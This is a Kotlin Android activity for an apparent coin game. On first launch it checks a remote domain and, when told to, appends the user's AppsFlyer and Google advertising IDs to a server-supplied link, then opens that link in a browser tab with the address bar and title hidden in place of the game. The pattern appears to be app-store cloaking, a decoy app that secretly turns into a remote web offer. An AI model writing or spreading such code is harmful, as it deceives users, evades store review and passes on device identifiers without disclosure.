package com.croooownthreecoinsssss

import android.app.PendingIntent
import android.content.Intent
import android.content.SharedPreferences
import android.content.res.Resources
import android.graphics.BitmapFactory
import android.graphics.Color
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebView
import androidx.browser.customtabs.CustomTabsIntent
import com.croooownthreecoinsssss.PreferenceHelper.APPSFLYER_ID
import com.croooownthreecoinsssss.PreferenceHelper.FIRST_OPEN
import com.croooownthreecoinsssss.PreferenceHelper.GAME_START
import com.croooownthreecoinsssss.PreferenceHelper.NAMING_SUBS
import com.croooownthreecoinsssss.PreferenceHelper.STATE_ADS
import com.croooownthreecoinsssss.PreferenceHelper.URL_LINK
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import com.google.android.gms.common.GooglePlayServicesRepairableException
import com.google.firebase.BuildConfig
import com.onesignal.OneSignal
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.plugins.ClientRequestException
import io.ktor.client.request.get
import io.ktor.http.HttpStatusCode
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.IOException
import java.util.Timer
import java.util.TimerTask
import kotlin.coroutines.CoroutineContext

class MainActivity : AppCompatActivity(), CoroutineScope {

    var response: String? = null
    var GAID: String? = null
    var URL: String? = null
    var prefs: SharedPreferences? = null
    var naming: String? = null

    private var job: Job = Job()

    override val coroutineContext: CoroutineContext
        get() = Dispatchers.Main + job

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }

    lateinit var webView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        prefs = PreferenceHelper.defaultPreference(applicationContext)
        if (prefs?.FIRST_OPEN == false) {
            prefs?.FIRST_OPEN = true
            setContentView(R.layout.load_layout)
            if(CrownThreeCoinsNetwork.getBooleanNEtwork(applicationContext)) {
                prefs?.STATE_ADS = true
                prefs?.GAME_START = false
                launch {
                    makeRequest()
                    gaidAsync()
                }
            }
            else{
                setContentView(R.layout.activity_main)
                prefs?.STATE_ADS = false
                prefs?.GAME_START = true
            }

        } else {
            if (prefs?.STATE_ADS == true) {
                crownThreeCoins(1)
            } else if (prefs?.GAME_START == true) {
                setContentView(R.layout.activity_main)
            }
        }
    }

    fun handler(view: View) {
        if (view.tag == "game") startActivity(Intent(applicationContext, Game::class.java))
        else {
            crownThreeCoins(0)
        }
    }

    suspend fun makeRequest() {
        val client = HttpClient(CIO)

        try {
            val response2: io.ktor.client.statement.HttpResponse = client.get("https://timetooopllaytthatfisshhthathisnameisfishhrobbin.space/7bjg7RR1")

            if (response2.status == HttpStatusCode.OK) {

                URL = "https://timetooopllaytthatfisshhthathisnameisfishhrobbin.space/mv8LqP8Z"
                parseRequestKeit()
                Log.d("Tag", "Success request")

            } else {
                Log.d("Exit", "exit")
                setContentView(R.layout.activity_main)
                prefs?.STATE_ADS = false
                prefs?.GAME_START = true

                return
            }
        } catch (e: ClientRequestException) {

            println("Error for request: ${e.message}")
        } finally {
            client.close()
        }
    }

    private fun parseRequestKeit(){

        var m = 0
        val timer3 = Timer()
        timer3.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                runOnUiThread {

                    naming = prefs?.NAMING_SUBS
                    if (naming != "naming" && naming != "") {
                        timer3.cancel()
                        formNamingLink()
                    }else{
                        m++
                        if(m>20){
                            timer3.cancel()
                            formNamingLink()
                        }
                    }
                }
            }
        }, 500, 500)

    }

    private fun formNamingLink(){

        if (naming != null && naming!!.contains("sub_id_3")) {
            prefs?.URL_LINK =
                URL + naming + "apps_id=" + prefs?.APPSFLYER_ID + "&advert_id=" + GAID

        } else {
            prefs?.URL_LINK =
                URL + "?apps_id=" + prefs?.APPSFLYER_ID + "&advert_id=" + GAID

        }
        runOnUiThread {  crownThreeCoins(1) }
    }


    private fun <R> CoroutineScope.executeAsyncTask(
        onPreExecute: () -> Unit,
        doInBackground: () -> R,
        onPostExecute: (R) -> Unit
    ) = launch {
        onPreExecute()
        val result = withContext(Dispatchers.IO) { // runs in background thread without blocking the Main Thread
            doInBackground()
        }
        onPostExecute(result)
    }

    private suspend fun gaidAsync() = coroutineScope {

        executeAsyncTask(onPreExecute = {
            // ...
        }, doInBackground = {

            getGAID()

            "Result" // send data to "onPostExecute"
        }, onPostExecute = {
            // ... here "it" is a data returned from "doInBackground"
        })

        // }
    }


    fun getGAID()  {
        var idInfo: AdvertisingIdClient.Info? = null
        try {
            idInfo = AdvertisingIdClient.getAdvertisingIdInfo(
                applicationContext
            )
        } catch (e: GooglePlayServicesNotAvailableException) {
            e.printStackTrace()
        } catch (e: GooglePlayServicesRepairableException) {
            e.printStackTrace()
        } catch (e: IOException) {
            e.printStackTrace()
        }
        try {
            GAID = idInfo!!.id
            OneSignal.sendTag("ad_id", GAID)
        } catch (e: NullPointerException) {
            e.printStackTrace()
        }

    }

    private fun crownThreeCoins(i: Int) {
        try {
            response = if (i == 0)
                "https://www.termsfeed.com/live/23b591b4-d03f-41f6-ba5a-c642fa77f4c9"
            else
                prefs?.URL_LINK

            val options = BitmapFactory.Options()
            options.outWidth = 24
            options.outHeight = 24
            options.inScaled = true
            val backButton =
                BitmapFactory.decodeResource(resources, R.drawable.round_done_black_24dp, options)
            val builder = CustomTabsIntent.Builder()
            builder.enableUrlBarHiding()
            builder.setToolbarColor(Color.BLACK)
            builder.setShowTitle(false)

            builder.setCloseButtonIcon(backButton)
            val shareLabel = getString(R.string.app_name)
            val actionIntent = Intent(
                this.applicationContext, ShareBroadcastReceiver::class.java
            )
            val pendingIntent = PendingIntent.getBroadcast(applicationContext, 0, actionIntent,
                PendingIntent.FLAG_IMMUTABLE
            )

            builder.setActionButton(backButton, shareLabel, pendingIntent)
            builder.setActionButton(backButton, shareLabel, pendingIntent, false)

            val customTabsIntent = builder.build()
            customTabsIntent.intent.setPackage("com.android.chrome")

            if (response!!.startsWith("https://")) {
                customTabsIntent.launchUrl(this, Uri.parse(response))
                finish()
            }
        } catch (e: Resources.NotFoundException) {
            if (BuildConfig.DEBUG) {
                e.printStackTrace()
            }
        }
    }
}